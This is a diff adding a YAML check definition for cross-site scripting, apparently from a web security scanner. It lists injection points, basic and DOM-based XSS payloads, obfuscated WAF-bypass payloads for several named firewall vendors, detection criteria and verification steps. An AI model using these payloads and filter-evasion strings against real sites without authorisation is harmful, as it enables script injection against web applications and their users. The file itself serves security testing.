@@ -1,0 +1,56 @@
+id: xss
+name: Cross-Site Scripting
+severity_range: [medium, critical]
+
+injection_points:
+  - url_parameters
+  - form_inputs
+  - http_headers
+  - file_upload_names
+  - json_values
+  - url_fragments
+
+payloads:
+  basic:
+    - '<script>alert(1)</script>'
+    - '"><img src=x onerror=alert(1)>'
+    - "javascript:alert(1)"
+    - '<svg onload=alert(1)>'
+    - '<body onload=alert(1)>'
+    - '<img src=x onerror=alert(1)>'
+    - "'-alert(1)-'"
+    - '<details open ontoggle=alert(1)>'
+    - '<marquee onstart=alert(1)>'
+
+  waf_bypass:
+    cloudflare:
+      - '<svg onload=alert%26%230000000040"1")>'
+      - '<a"/telerik:evntvalidation="" onbefordeactivate="confirm(document.domain)">'
+      - '<img%20LJ%20DEf%20SRC=%20onerror=prompt(1);>'
+      - '<details/open/ontoggle="self[`aler`+`t`](1)">'
+    cloudfront:
+      - '"><img%20src=x%20onerror=confirm(1);>'
+      - '">%3Cimg%2Fsrc%3D%22x%22%2Fonerror%3D%22prom%5Cu0444444pt%2522%2522%3E'
+    imperva:
+      - '<details/open/ontoggle="self[`aler`+`t`](1)">'
+      - '<svg/onload={alert`1`}>'
+    modsecurity:
+      - '<img src=x onerror=prompt(1)>'
+      - '<svg/onload=alert(1)>'
+    aws_waf:
+      - '<details open ontoggle=confirm(1)>'
+
+  dom_based:
+    - 'javascript:alert(document.domain)'
+    - '#<img src=x onerror=alert(1)>'
+
+detection:
+  reflected: "payload appears in response body in an executable context"
+  stored: "payload persists and executes on subsequent page loads"
+  dom: "payload modifies DOM via client-side JS without server reflection"
+
+verification:
+  - "confirm payload executes in browser context (not inside comment/attribute)"
+  - "test 3+ payload variations to rule out coincidence"
+  - "send benign input to verify it does NOT trigger"
+  - "check if output encoding is applied"
